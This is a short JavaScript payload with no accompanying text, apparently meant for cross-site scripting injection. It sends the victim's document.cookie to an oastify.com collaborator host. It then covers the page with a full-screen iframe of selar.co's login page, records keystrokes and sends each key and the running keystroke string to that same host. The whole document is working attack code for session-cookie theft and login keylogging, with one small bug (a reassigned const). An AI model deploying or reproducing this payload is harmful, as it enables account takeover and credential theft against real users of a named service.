fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${document.cookie}`);
setTimeout(function() {}, 3000);
document.body.style.setProperty('height', '100vh')
document.body.addEventListener('keydown', function (e) {console.log(e.key)});
const iframe = document.createElement('iframe');
iframe.src = 'https://selar.co/login';
iframe.width = '100%';
iframe.height = '100%'; 
iframe.style.border = 'none';
iframe.onload = function () {
    console.log('Iframe has loaded successfully!');
};
document.body.appendChild(iframe);
const currSession="";
document.body.addEventListener('keydown', (event) => {
    console.log(`Key pressed: ${event.key}`);
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${event.key}`);
    currSession += String(event.key)
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com${currSession}`);
});
